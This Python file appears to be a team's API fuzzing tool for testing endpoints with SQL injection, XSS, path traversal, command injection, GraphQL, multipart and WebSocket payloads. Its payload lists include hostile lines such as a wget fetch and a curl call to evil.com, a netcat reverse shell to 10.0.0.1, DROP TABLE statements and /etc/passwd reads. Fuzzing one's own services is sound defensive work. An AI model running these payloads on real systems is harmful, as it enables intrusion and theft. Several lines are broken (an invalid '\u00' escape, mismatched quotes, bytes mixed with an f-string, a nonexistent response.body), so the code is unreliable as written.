"""
API Fuzzing Framework - Comprehensive Input Validation Testing

Tests API endpoints against:
- Malformed JSON payloads
- Boundary conditions
- SQL injection patterns
- XSS vectors
- Path traversal attempts
- Command injection
- Type confusion attacks
- Overflow/underflow values
- Unicode exploits
- GraphQL mutations

Author: Security Team
Date: 2025-12-24

Usage:
    python app/testing/api_fuzzer.py --target http://localhost:8000 --threads 10
"""

import argparse
import asyncio
import json
import random
import string
import sys
import uuid
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

# =============================================================================
# Fuzzing Strategy Classes
# =============================================================================

class FuzzType(Enum):
    """Types of fuzzing payloads"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    OVERFLOW = "overflow"
    UNDERFLOW = "underflow"
    TYPE_CONFUSION = "type_confusion"
    UNICODE = "unicode"
    NULL_BYTE = "null_byte"
    MALFORMED_JSON = "malformed_json"
    BOUNDARY = "boundary"
    RANDOM = "random"


@dataclass
class FuzzResult:
    """Result of a fuzzing test"""
    endpoint: str
    method: str
    payload_type: FuzzType
    payload: Any
    status_code: int
    response_time_ms: float
    response_length: int
    error_detected: bool
    vulnerability_type: Optional[str]
    details: Optional[Dict]


# =============================================================================
# Payload Generators
# =============================================================================

class PayloadGenerator:
    """Generates various types of fuzzing payloads"""

    # SQL Injection Payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT username, password FROM users--",
        "1; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir'); --",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "admin'#" ,
        "admin'/*",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "') OR ('1'='1--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' HAVING 1=1--",
        "1' GROUP BY username--",
        "CONVERT((SELECT version()), INT)--",
        "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
    ]

    # XSS Payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(XSS)'>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<embed src='javascript:alert(XSS)'>",
        "<object data='javascript:alert(XSS')'>",
        "'-alert('XSS')-'",
        "'-alert('XSS')-'",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(document.cookie)</script>",
    ]

    # Path Traversal Payloads
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252fetc%2fpasswd",
        "..%252f..%252f..%252fetc%2fpasswd",
        "....\\\\....\\\\....\\\\....\\\\boot.ini",
        "..%5c..%5c..%5cboot.ini",
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini",
        "/etc/passwd",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "../../../../../../../../etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/var/www/html/../config.php",
        "WEB-INF/web.xml",
        "META-INF/context.xml",
    ]

    # Command Injection Payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "&& ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; dir",
        "| dir",
        "&& dir",
        "`dir`",
        "$(dir)",
        "; whoami",
        "; id",
        "; uname -a",
        "&& wget http://evil.com/shell.txt",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "`python -c 'import socket; ...'`",
        "$(python -c 'import socket; ...')",
        "; ping -c 1 10.0.0.1",
        "|| echo pwned",
        "; echo vulnerable > /tmp/pwned",
        "`curl http://evil.com`",
        "$(curl http://evil.com)",
    ]

    # Boundary Values
    BOUNDARY_PAYLOADS = {
        'string': [
            "",  # Empty
            "a",  # Single char
            "a" * 255,  # Max 8-bit
            "a" * 256,  # Overflow 8-bit
            "a" * 65535,  # Max 16-bit
            "a" * 65536,  # Overflow 16-bit
            "a" * 1000000,  # Very large
        ],
        'integer': [
            -2147483648,  # Min 32-bit
            2147483647,  # Max 32-bit
            -2147483649,  # Underflow 32-bit
            2147483648,  # Overflow 32-bit
            -9223372036854775808,  # Min 64-bit
            9223372036854775807,  # Max 64-bit
            0,
            -1,
            999999999999999999999,
        ],
        'float': [
            1.7976931348623157e+308,  # Max float
            -1.7976931348623157e+308,  # Min float
            3.1415926535897932384626433832795028841971,
            float('inf'),
            float('-inf'),
            float('nan'),
        ],
        'list': [
            [],  # Empty
            [1] * 100,  # 100 items
            [1] * 1000,  # 1000 items
            [1] * 10000,  # 10000 items
        ],
    }

    # Unicode Exploits
    UNICODE_PAYLOADS = [
        "\u0000",  # Null byte
        "\uFEFF",  # BOM
        "\u200B",  # Zero-width space
        "\u200C",  # Zero-width non-joiner
        "\u200D",  # Zero-width joiner
        "\u202A",  # Left-to-right override
        "\u202B",  # Right-to-left override
        "\u202C",  # Pop directional formatting
        "\u202D",  # Pop directional formatting
        "\u202E",  # Right-to-left override
        "\uFFF0",  # Non-character
        "\uFFFF",  # Non-character
        "\U000E0001",  # Private use
        "\U0010FFFE",  # Non-character
        "😀",  # Emoji
        "𝕿𝕿𝕿𝕿",  # Mathematical bold
        "ＡＢＣ",  # Fullwidth
        "̨̨̨̨̨",  # Combining marks
        "\u0301\u0301\u0301",  # Multiple accents
        "test\u202eevil",  # RTL override
        "evil\u202etest",  # RTL override
    ]

    # Type Confusion Payloads
    TYPE_CONFUSION_PAYLOADS = [
        None,
        True,
        False,
        [],
        {},
        lambda: None,  # Function
        object(),  # Object
        datetime.now(),  # DateTime
        timedelta(days=1),
        uuid.uuid4(),
        b"bytes",
        bytearray(10),
        memoryview(b"test"),
        frozenset([1, 2, 3]),
        range(10),
    ]

    # Malformed JSON
    MALFORMED_JSON_PAYLOADS = [
        '{"unclosed": true',
        '{"missing_bracket": true}',
        '{"extra": ]}}',
        '{"trailing_comma": true,}',
        '{,}',
        '{"unicode": "\u00"}',
        '{"unicode": "\uD800"}',  # Lone surrogate
        '{"deep": {}}',
        '{"deep": {' * 1000 + '}' * 1000,
        '{"array": [' + '1,' * 1000 + ']}',
        '{"string": "\\"\\"'}',
        '{"comment": /* comment */ true}',
        '{"nesting": ' + '{"a":' * 100 + '"b"' + '}' * 100 + '}',
        '{"duplicate": 1, "duplicate": 2}',
        'true',
        'false',
        'null',
        '123',
        '"string"',
    ]

    @staticmethod
    def generate_random_payload(min_length: int = 1, max_length: int = 10000) -> str:
        """Generate random alphanumeric payload"""
        length = random.randint(min_length, max_length)
        chars = string.ascii_letters + string.digits + string.punctuation + ' '
        return ''.join(random.choice(chars) for _ in range(length))

    @staticmethod
    def generate_fuzzed_json(base_schema: Dict, iterations: int = 100) -> List[Dict]:
        """Generate fuzzed JSON payloads based on schema"""
        payloads = []

        for _ in range(iterations):
            fuzzed = PayloadGenerator._fuzz_dict(base_schema)
            payloads.append(fuzzed)

        return payloads

    @staticmethod
    def _fuzz_dict(schema: Dict, depth: int = 0) -> Dict:
        """Recursively fuzz dictionary values"""
        if depth > 5:  # Prevent infinite recursion
            return schema

        fuzzed = {}
        for key, value in schema.items():
            if isinstance(value, dict):
                fuzzed[key] = PayloadGenerator._fuzz_dict(value, depth + 1)
            elif isinstance(value, list):
                fuzzed[key] = PayloadGenerator._fuzz_list(value, depth + 1)
            else:
                fuzzed[key] = PayloadGenerator._fuzz_value(value)

        return fuzzed

    @staticmethod
    def _fuzz_list(schema: List, depth: int = 0) -> List:
        """Recursively fuzz list values"""
        if depth > 5:
            return schema

        if not schema:
            return [PayloadGenerator._fuzz_value("test")]

        return [PayloadGenerator._fuzz_value(schema[0]) for _ in range(random.randint(0, 10))]

    @staticmethod
    def _fuzz_value(value: Any) -> Any:
        """Fuzz a single value"""
        fuzz_type = random.choice([
            'keep', 'sql', 'xss', 'path', 'command',
            'boundary', 'unicode', 'type_confusion'
        ])

        if fuzz_type == 'keep':
            return value
        elif fuzz_type == 'sql':
            return random.choice(PayloadGenerator.SQL_INJECTION_PAYLOADS)
        elif fuzz_type == 'xss':
            return random.choice(PayloadGenerator.XSS_PAYLOADS)
        elif fuzz_type == 'path':
            return random.choice(PayloadGenerator.PATH_TRAVERSAL_PAYLOADS)
        elif fuzz_type == 'command':
            return random.choice(PayloadGenerator.COMMAND_INJECTION_PAYLOADS)
        elif fuzz_type == 'boundary':
            if isinstance(value, str):
                return random.choice(PayloadGenerator.BOUNDARY_PAYLOADS['string'])
            elif isinstance(value, int):
                return random.choice(PayloadGenerator.BOUNDARY_PAYLOADS['integer'])
            elif isinstance(value, float):
                return random.choice(PayloadGenerator.BOUNDARY_PAYLOADS['float'])
            elif isinstance(value, bool):
                return random.choice([True, False, None, "", "true", "false"])
            else:
                return value
        elif fuzz_type == 'unicode':
            return random.choice(PayloadGenerator.UNICODE_PAYLOADS)
        elif fuzz_type == 'type_confusion':
            return random.choice(PayloadGenerator.TYPE_CONFUSION_PAYLOADS)

        return value


# =============================================================================
# GraphQL Fuzzer
# =============================================================================

class GraphQLFuzzer:
    """Fuzzing for GraphQL endpoints"""

    # GraphQL injection payloads
    GRAPHQL_PAYLOADS = [
        # Introspection attempts
        '{__schema{queryType{fields{name}}}}',
        '{__type(name:"User"){fields{name}}}',
        '{__schema{mutationType{fields{name}}}}',

        # Nested queries (DoS)
        '{' + 'user(id:"1"){friends{friends{friends{friends{friends{friends{friends{friends{friends{friends{name}}}}}}}}}}}}}' * 10,

        # Alias confusion
        '{user1:user(id:"1"){name},user2:user(id:"1"){name}}',

        # Fragment loops
        'fragment userFields on User {...userFields}}',
        'fragment userFields on User {name,friends{...userFields}}',

        # Injection attempts
        '{user(id:"1\'; DROP TABLE users--"){name}}',
        '{user(id:"<script>alert(1)</script>"){name}}',

        # Batching attacks
        '{user(id:"1"){name}}{user(id:"2"){name}}{user(id:"3"){name}}' * 100,

        # Large queries
        '{user(id:"' + 'A' * 10000 + '"){name}}',

        # Unicode tricks
        '{user(id:"\\u0000"){name}}',
        '{user(id:"\\uFEFF"){name}}',

        # Comments abuse
        '{user(id:"test"#\ncomment\n){name}}',
    ]

    # GraphQL mutations to fuzz
    MUTATION_TEMPLATES = [
        'mutation {{create{entity}({fields})}}',
        'mutation {{update{entity}(id:"{id}",{fields})}}',
        'mutation {{delete{entity}(id:"{id}")}}',
    ]

    @staticmethod
    def generate_malicious_queries(base_query: str, iterations: int = 50) -> List[str]:
        """Generate malicious GraphQL queries"""
        queries = []

        for _ in range(iterations):
            # Randomly select attack type
            attack_type = random.choice([
                'injection', 'dos', 'introspection', 'batching'
            ])

            if attack_type == 'injection':
                queries.append(GraphQLFuzzer._inject_into_query(base_query))
            elif attack_type == 'dos':
                queries.append(GraphQLFuzzer._create_dos_query())
            elif attack_type == 'introspection':
                queries.append(random.choice(GraphQLFuzzer.GRAPHQL_PAYLOADS[:3]))
            elif attack_type == 'batching':
                queries.append(GraphQLFuzzer._create_batching_query())

        return queries

    @staticmethod
    def _inject_into_query(query: str) -> str:
        """Inject payloads into GraphQL query"""
        injection = random.choice(
            PayloadGenerator.SQL_INJECTION_PAYLOADS +
            PayloadGenerator.XSS_PAYLOADS
        )

        # Replace string values with injection
        import re
        return re.sub(r'"[^"]*"', f'"{injection}"', query)

    @staticmethod
    def _create_dos_query() -> str:
        """Create DoS query (nested/circular)"""
        depth = random.randint(5, 20)
        query = '{user(id:"1"){'
        query += 'friends{' * depth + 'name' + '}' * depth
        query += '}}'
        return query

    @staticmethod
    def _create_batching_query() -> str:
        """Create batching attack query"""
        batch_size = random.randint(10, 100)
        queries = [f'{{user(id:"{i}"){{name}}}}' for i in range(batch_size)]
        return ''.join(queries)


# =============================================================================
# WebSocket Fuzzer
# =============================================================================

class WebSocketFuzzer:
    """Fuzzing for WebSocket endpoints"""

    # Malformed WebSocket frames
    MALFORMED_FRAMES = [
        b'\x00\xff\xff\xff\xff',  # Invalid UTF-8
        b'\x01' * 10000,  # Huge frame
        b'\x02' * 10000,  # Binary frame
        b'\x08',  # Close frame without payload
        b'\x09',  # Ping frame
        b'\x0A',  # Pong frame
        b'\x00',  # Continuation frame
        b'\x00\x00\x00',  # Multiple continuation frames
        b'\\x00\\xff',  # Escaped bytes
        '',  # Empty frame
    ]

    @staticmethod
    async def fuzz_websocket(url: str, iterations: int = 100) -> List[FuzzResult]:
        """Fuzz WebSocket endpoint"""
        results = []

        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(url) as ws:
                    # Test malformed frames
                    for frame_data in WebSocketFuzzer.MALFORMED_FRAMES:
                        try:
                            start_time = datetime.now()
                            await ws.send_str(frame_data.decode() if isinstance(frame_data, bytes) else frame_data)
                            response = await asyncio.wait_for(ws.receive(), timeout=5)
                            elapsed = (datetime.now() - start_time).total_seconds() * 1000

                            results.append(FuzzResult(
                                endpoint=url,
                                method="WEBSOCKET",
                                payload_type=FuzzType.MALFORMED_JSON,
                                payload=frame_data,
                                status_code=response.type if hasattr(response, 'type') else 0,
                                response_time_ms=elapsed,
                                response_length=0,
                                error_detected=ws.closed,
                                vulnerability_type="WebSocket closed unexpectedly" if ws.closed else None,
                                details={"frame_type": type(response).__name__}
                            ))
                        except Exception as e:
                            results.append(FuzzResult(
                                endpoint=url,
                                method="WEBSOCKET",
                                payload_type=FuzzType.MALFORMED_JSON,
                                payload=frame_data,
                                status_code=0,
                                response_time_ms=0,
                                response_length=0,
                                error_detected=True,
                                vulnerability_type=str(e),
                                details={"error": str(e)}
                            ))

                    # Test JSON injection
                    for i in range(iterations):
                        payload = json.dumps({
                            "query": random.choice(GraphQLFuzzer.GRAPHQL_PAYLOADS),
                            "variables": PayloadGenerator.generate_random_payload(10, 1000)
                        })

                        try:
                            start_time = datetime.now()
                            await ws.send_str(payload)
                            response = await asyncio.wait_for(ws.receive(), timeout=5)
                            elapsed = (datetime.now() - start_time).total_seconds() * 1000

                            results.append(FuzzResult(
                                endpoint=url,
                                method="WEBSOCKET",
                                payload_type=FuzzType.SQL_INJECTION if "DROP" in payload else FuzzType.XSS,
                                payload=payload,
                                status_code=response.type if hasattr(response, 'type') else 0,
                                response_time_ms=elapsed,
                                response_length=0,
                                error_detected=False,
                                vulnerability_type=None,
                                details={}
                            ))
                        except Exception as e:
                            results.append(FuzzResult(
                                endpoint=url,
                                method="WEBSOCKET",
                                payload_type=FuzzType.SQL_INJECTION if "DROP" in payload else FuzzType.XSS,
                                payload=payload,
                                status_code=0,
                                response_time_ms=0,
                                response_length=0,
                                error_detected=True,
                                vulnerability_type=str(e),
                                details={"error": str(e)}
                            ))

        except Exception as e:
            print(f"WebSocket connection error: {e}")

        return results


# =============================================================================
# Multipart Upload Fuzzer
# =============================================================================

class MultipartFuzzer:
    """Fuzzing for multipart file uploads"""

    # Malformed multipart payloads
    MALFORMED_PARTS = [
        # Missing boundaries
        b'Content-Disposition: form-data; name="file"\r\n\r\ntest',

        # Invalid boundary
        b'-----------------------------INVALID\r\n'
        b'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        b'test\r\n'
        b'-----------------------------INVALID--',

        # Missing filename
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"\r\n'
        b'Content-Type: application/octet-stream\r\n\r\n'
        b'malicious content\r\n'
        b'-----------------------------boundary--',

        # Huge filename
        b'-----------------------------boundary\r\n'
        f'Content-Disposition: form-data; name="file"; filename="{"A" * 10000}.txt"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        b'test\r\n'
        b'-----------------------------boundary--',

        # Null bytes in filename
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="test\x00.txt"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        b'test\r\n'
        b'-----------------------------boundary--',

        # Path traversal in filename
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        b'test\r\n'
        b'-----------------------------boundary--',

        # Missing Content-Type
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n\r\n'
        b'test\r\n'
        b'-----------------------------boundary--',

        # Multiple files with same name
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="test1.txt"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        b'content1\r\n'
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="test2.txt"\r\n'
        b'Content-Type: text/plain\r\n\r\n'
        b'content2\r\n'
        b'-----------------------------boundary--',

        # Executable content type with .txt extension
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="safe.txt.exe"\r\n'
        b'Content-Type: application/x-msdownload\r\n\r\n'
        b'malicious\r\n'
        b'-----------------------------boundary--',

        # Content injection in Content-Type
        b'-----------------------------boundary\r\n'
        b'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n'
        b'Content-Type: image/png\r\n\r\n'
        b'\x89PNG\r\n\x1a\n\x00\x00\x00\r\nIHDR\x00\x00\x00\x01' + b'A' * 10000 + b'\r\n'
        b'-----------------------------boundary--',
    ]

    # Malicious file contents
    MALICIOUS_FILE_CONTENTS = [
        b'\x00\x00\x00\x00',  # Null bytes
        b'<script>alert("XSS")</script>',  # XSS in file
        b'<?php system("ls"); ?>',  # PHP code
        b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Kids[3 0 R]/Count 1>>endobj 3 0 obj<</MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>/Type/Page>>endobj\nxref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n191\n%%EOF',  # PDF with injections
        b'GIF89a<script>alert("XSS")</script>',  # GIF with XSS
        b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00<script>alert("XSS")</script>',  # JPEG with XSS
    ]

    @staticmethod
    async def fuzz_multipart_upload(url: str, iterations: int = 50) -> List[FuzzResult]:
        """Fuzz multipart file upload endpoint"""
        results = []

        async with aiohttp.ClientSession() as session:
            # Test malformed multipart structures
            for payload in MultipartFuzzer.MALFORMED_PARTS:
                try:
                    start_time = datetime.now()

                    headers = {
                        'Content-Type': 'multipart/form-data; boundary=---------------------------boundary'
                    }

                    response = await asyncio.wait_for(
                        session.post(url, data=payload, headers=headers),
                        timeout=10
                    )

                    elapsed = (datetime.now() - start_time).total_seconds() * 1000

                    results.append(FuzzResult(
                        endpoint=url,
                        method="POST",
                        payload_type=FuzzType.MALFORMED_JSON,
                        payload=payload.decode('latin1')[:100],
                        status_code=response.status,
                        response_time_ms=elapsed,
                        response_length=len(await response.read()),
                        error_detected=response.status >= 500,
                        vulnerability_type="Server error on malformed upload" if response.status >= 500 else None,
                        details={}
                    ))

                except Exception as e:
                    results.append(FuzzResult(
                        endpoint=url,
                        method="POST",
                        payload_type=FuzzType.MALFORMED_JSON,
                        payload=str(payload)[:100],
                        status_code=0,
                        response_time_ms=0,
                        response_length=0,
                        error_detected=True,
                        vulnerability_type=str(e),
                        details={"error": str(e)}
                    ))

            # Test malicious file contents
            for content in MultipartFuzzer.MALICIOUS_FILE_CONTENTS:
                for i in range(iterations // len(MultipartFuzzer.MALICIOUS_FILE_CONTENTS)):
                    try:
                        data = aiohttp.FormData()
                        data.add_field('file', content, filename='test.txt', content_type='text/plain')

                        start_time = datetime.now()
                        response = await asyncio.wait_for(session.post(url, data=data), timeout=10)
                        elapsed = (datetime.now() - start_time).total_seconds() * 1000

                        results.append(FuzzResult(
                            endpoint=url,
                            method="POST",
                            payload_type=FuzzType.XSS if b'script' in content else FuzzType.COMMAND_INJECTION,
                            payload=content[:100],
                            status_code=response.status,
                            response_time_ms=elapsed,
                            response_length=len(await response.read()),
                            error_detected=response.status >= 500,
                            vulnerability_type=None,
                            details={}
                        ))

                    except Exception as e:
                        results.append(FuzzResult(
                            endpoint=url,
                            method="POST",
                            payload_type=FuzzType.XSS if b'script' in content else FuzzType.COMMAND_INJECTION,
                            payload=str(content)[:100],
                            status_code=0,
                            response_time_ms=0,
                            response_length=0,
                            error_detected=True,
                            vulnerability_type=str(e),
                            details={"error": str(e)}
                        ))

        return results


# =============================================================================
# Main Fuzzer
# =============================================================================

class APIFuzzer:
    """Main API fuzzing orchestrator"""

    def __init__(self, target_url: str, max_threads: int = 10):
        self.target_url = target_url.rstrip('/')
        self.max_threads = max_threads
        self.results: List[FuzzResult] = []

    async def fuzz_json_parameters(
        self,
        endpoint: str,
        method: str = "POST",
        base_schema: Optional[Dict] = None,
        iterations: int = 100
    ) -> List[FuzzResult]:
        """Fuzz JSON parameters"""
        print(f"\n[*] Fuzzing JSON parameters: {method} {endpoint}")

        if base_schema is None:
            base_schema = {
                "username": "testuser",
                "email": "test@example.com",
                "password": "password123",
                "age": 25,
                "active": True,
                "preferences": {"theme": "dark", "notifications": True}
            }

        payloads = PayloadGenerator.generate_fuzzed_json(base_schema, iterations)
        results = []

        async with aiohttp.ClientSession() as session:
            tasks = []
            for payload in payloads:
                task = self._send_fuzz_request(
                    session,
                    endpoint,
                    method,
                    payload,
                    FuzzType.SQL_INJECTION
                )
                tasks.append(task)

            chunk_size = self.max_threads
            for i in range(0, len(tasks), chunk_size):
                chunk = tasks[i:i + chunk_size]
                chunk_results = await asyncio.gather(*chunk, return_exceptions=True)
                results.extend([r for r in chunk_results if isinstance(r, FuzzResult)])

        self.results.extend(results)
        return results

    async def fuzz_url_encoded(
        self,
        endpoint: str,
        base_params: Optional[Dict] = None,
        iterations: int = 100
    ) -> List[FuzzResult]:
        """Fuzz URL-encoded payloads"""
        print(f"\n[*] Fuzzing URL-encoded parameters: {endpoint}")

        if base_params is None:
            base_params = {
                "username": "testuser",
                "email": "test@example.com",
                "search": "test query"
            }

        results = []

        async with aiohttp.ClientSession() as session:
            # Test SQL injection
            for param in base_params.keys():
                for payload in PayloadGenerator.SQL_INJECTION_PAYLOADS[:10]:
                    params = base_params.copy()
                    params[param] = payload

                    result = await self._send_fuzz_request(
                        session,
                        endpoint,
                        "GET",
                        params,
                        FuzzType.SQL_INJECTION
                    )
                    results.append(result)

            # Test XSS
            for param in base_params.keys():
                for payload in PayloadGenerator.XSS_PAYLOADS[:10]:
                    params = base_params.copy()
                    params[param] = payload

                    result = await self._send_fuzz_request(
                        session,
                        endpoint,
                        "GET",
                        params,
                        FuzzType.XSS
                    )
                    results.append(result)

        self.results.extend(results)
        return results

    async def fuzz_graphql(
        self,
        endpoint: str,
        base_query: str,
        iterations: int = 50
    ) -> List[FuzzResult]:
        """Fuzz GraphQL endpoint"""
        print(f"\n[*] Fuzzing GraphQL endpoint: {endpoint}")

        queries = GraphQLFuzzer.generate_malicious_queries(base_query, iterations)
        results = []

        async with aiohttp.ClientSession() as session:
            for query in queries:
                payload = {"query": query}

                result = await self._send_fuzz_request(
                    session,
                    endpoint,
                    "POST",
                    payload,
                    FuzzType.SQL_INJECTION if "DROP" in query else FuzzType.XSS
                )
                results.append(result)

        self.results.extend(results)
        return results

    async def fuzz_all(
        self,
        endpoints: List[str],
        iterations: int = 100
    ) -> Dict[str, List[FuzzResult]]:
        """Run comprehensive fuzzing on all endpoints"""
        print(f"\n[*] Starting comprehensive API fuzzing")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Endpoints: {len(endpoints)}")
        print(f"[*] Iterations per endpoint: {iterations}")

        all_results = {}

        for endpoint in endpoints:
            print(f"\n{'='*60}")
            print(f"Fuzzing: {endpoint}")
            print(f"{'='*60}")

            endpoint_results = []

            # JSON fuzzing
            json_results = await self.fuzz_json_parameters(endpoint, "POST", iterations=iterations)
            endpoint_results.extend(json_results)

            # URL-encoded fuzzing
            url_results = await self.fuzz_url_encoded(endpoint, iterations=iterations//2)
            endpoint_results.extend(url_results)

            # GraphQL fuzzing (if applicable)
            if "graphql" in endpoint.lower():
                base_query = '{user(id:"1"){name email}}'
                gql_results = await self.fuzz_graphql(endpoint, base_query, iterations=iterations//2)
                endpoint_results.extend(gql_results)

            # Multipart fuzzing (if upload endpoint)
            if "upload" in endpoint.lower():
                multipart_results = await MultipartFuzzer.fuzz_multipart_upload(endpoint, iterations//2)
                endpoint_results.extend(multipart_results)

            # WebSocket fuzzing (if ws://)
            if endpoint.startswith("ws://") or endpoint.startswith("wss://"):
                ws_results = await WebSocketFuzzer.fuzz_websocket(endpoint, iterations//2)
                endpoint_results.extend(ws_results)

            all_results[endpoint] = endpoint_results

            # Print summary for this endpoint
            errors = [r for r in endpoint_results if r.error_detected]
            print(f"\n  Results: {len(endpoint_results)} total, {len(errors)} errors")

        return all_results

    async def _send_fuzz_request(
        self,
        session: aiohttp.ClientSession,
        endpoint: str,
        method: str,
        payload: Any,
        payload_type: FuzzType
    ) -> FuzzResult:
        """Send a fuzzing request and capture result"""
        url = f"{self.target_url}{endpoint}"

        try:
            start_time = datetime.now()

            if method == "GET":
                response = await asyncio.wait_for(
                    session.get(url, params=payload, timeout=10),
                    timeout=15
                )
            elif method == "POST":
                response = await asyncio.wait_for(
                    session.post(url, json=payload, timeout=10),
                    timeout=15
                )
            else:
                response = await asyncio.wait_for(
                    session.request(method, url, json=payload, timeout=10),
                    timeout=15
                )

            elapsed = (datetime.now() - start_time).total_seconds() * 1000
            response_body = await response.text()

            # Detect potential vulnerabilities
            error_detected = False
            vulnerability_type = None

            if response.status >= 500:
                error_detected = True
                vulnerability_type = "Internal server error (possible DoS or crash)"
            elif response.status == 400:
                # Check if error message leaks information
                if "SQL" in response_body or "mysql" in response_body.lower() or "postgres" in response.body.lower():
                    error_detected = True
                    vulnerability_type = "SQL error message leakage"
                elif "syntax" in response_body and "error" in response_body.lower():
                    error_detected = True
                    vulnerability_type = "Detailed error message (information disclosure)"
            elif response.status == 200:
                # Check if payload was reflected (XSS)
                if isinstance(payload, str):
                    if payload in response_body:
                        error_detected = True
                        vulnerability_type = "Payload reflection (possible XSS)"

            return FuzzResult(
                endpoint=endpoint,
                method=method,
                payload_type=payload_type,
                payload=str(payload)[:200],
                status_code=response.status,
                response_time_ms=elapsed,
                response_length=len(response_body),
                error_detected=error_detected,
                vulnerability_type=vulnerability_type,
                details={
                    "response_preview": response_body[:200] if response_body else ""
                }
            )

        except asyncio.TimeoutError:
            return FuzzResult(
                endpoint=endpoint,
                method=method,
                payload_type=payload_type,
                payload=str(payload)[:200],
                status_code=0,
                response_time_ms=15000,
                response_length=0,
                error_detected=True,
                vulnerability_type="Timeout (possible DoS)",
                details={}
            )
        except Exception as e:
            return FuzzResult(
                endpoint=endpoint,
                method=method,
                payload_type=payload_type,
                payload=str(payload)[:200],
                status_code=0,
                response_time_ms=0,
                response_length=0,
                error_detected=True,
                vulnerability_type=str(e),
                details={"error": str(e)}
            )

    def generate_report(self) -> str:
        """Generate fuzzing report"""
        if not self.results:
            return "No results to report"

        total_tests = len(self.results)
        errors = [r for r in self.results if r.error_detected]
        vulnerabilities = [r for r in errors if r.vulnerability_type]

        report = []
        report.append("="*70)
        report.append("API FUZZING REPORT")
        report.append("="*70)
        report.append(f"Target: {self.target_url}")
        report.append(f"Total Tests: {total_tests}")
        report.append(f"Errors Detected: {len(errors)} ({len(errors)/total_tests*100:.1f}%)")
        report.append(f"Potential Vulnerabilities: {len(vulnerabilities)}")
        report.append("="*70)

        # Vulnerability breakdown
        vuln_types = {}
        for v in vulnerabilities:
            if v.vulnerability_type:
                vuln_types[v.vulnerability_type] = vuln_types.get(v.vulnerability_type, 0) + 1

        if vuln_types:
            report.append("\nVulnerabilities by Type:")
            report.append("-"*70)
            for vuln_type, count in sorted(vuln_types.items(), key=lambda x: x[1], reverse=True):
                report.append(f"  {vuln_type}: {count}")

        # Status code breakdown
        status_codes = {}
        for r in self.results:
            status_codes[r.status_code] = status_codes.get(r.status_code, 0) + 1

        report.append("\nResponse Code Distribution:")
        report.append("-"*70)
        for code, count in sorted(status_codes.items()):
            report.append(f"  {code}: {count} ({count/total_tests*100:.1f}%)")

        # Response time statistics
        response_times = [r.response_time_ms for r in self.results if r.response_time_ms > 0]
        if response_times:
            response_times.sort()
            report.append("\nResponse Time Statistics:")
            report.append("-"*70)
            report.append(f"  Min: {min(response_times):.2f}ms")
            report.append(f"  Max: {max(response_times):.2f}ms")
            report.append(f"  Avg: {sum(response_times)/len(response_times):.2f}ms")
            report.append(f"  Median: {response_times[len(response_times)//2]:.2f}ms")

        # Top vulnerabilities
        if vulnerabilities:
            report.append("\nTop Potential Vulnerabilities:")
            report.append("-"*70)
            for v in vulnerabilities[:10]:
                report.append(f"\n  [{v.method}] {v.endpoint}")
                report.append(f"  Payload Type: {v.payload_type.value}")
                report.append(f"  Status Code: {v.status_code}")
